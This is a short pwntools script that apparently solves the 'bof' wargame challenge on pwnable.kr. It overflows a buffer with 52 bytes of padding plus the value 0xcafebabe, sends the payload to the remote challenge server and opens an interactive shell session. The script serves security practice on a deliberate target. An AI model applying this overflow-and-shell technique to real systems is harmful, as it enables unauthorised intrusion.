import pwn

# elf = pwn.ELF('./bof')
# pwn.context.binary = elf
# pwn.context.log_level = 'DEBUG'
# libc = elf.libc

padding = b'a' * (16 * 3 + 4) 
message = padding + pwn.p32(0xcafebabe)
# p = elf.process()
# pwn.gdb.attach(p, gdbscript='b main')

# input("Press Enter to continue...")
p = pwn.remote('pwnable.kr', 9000)
p.send(message)
p.interactive()